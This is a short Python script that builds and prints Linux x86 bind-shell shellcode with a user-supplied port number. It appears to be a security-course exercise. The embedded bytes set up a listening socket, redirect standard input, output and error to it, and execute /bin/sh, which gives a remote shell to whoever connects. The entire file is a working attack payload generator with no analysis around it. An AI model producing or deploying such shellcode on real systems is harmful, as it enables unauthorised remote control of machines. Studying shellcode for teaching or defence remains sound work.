#import section
import sys
import socket

#shellcode used (TO DO: replace shellcode)
shellcode =  ""
shellcode += "\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9"
shellcode += "\\x31\\xd2\\x50\\x50\\x50\\x66\\x68\\x11"
shellcode += "\\x5c\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01"
shellcode += "\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7"
shellcode += "\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb"
shellcode += "\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80"
shellcode += "\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb"
shellcode += "\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8"
shellcode += "\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2"
shellcode += "\\x31\\xf6\\xcd\\x80\\x89\\xc6\\xb1\\x03"
shellcode += "\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\x49\\xcd"
shellcode += "\\x80\\x41\\xe2\\xf4\\x31\\xc0\\x50\\x68"
shellcode += "\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69"
shellcode += "\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80"

#Check if a port is specified
if len(sys.argv) < 2:
    print ('Usage: python {name} [port_to_bind]'.format(name = sys.argv[0]))
    exit(1)
#convert the port format from str to hex format
port = hex(socket.htons(int(sys.argv[1])))
# Replace port number
shellcode = shellcode.replace("\\x11\\x5c", "\\x{0}\\x{1}".format(port[4:6],port[2:4]))
#print shellcode
print(shellcode)
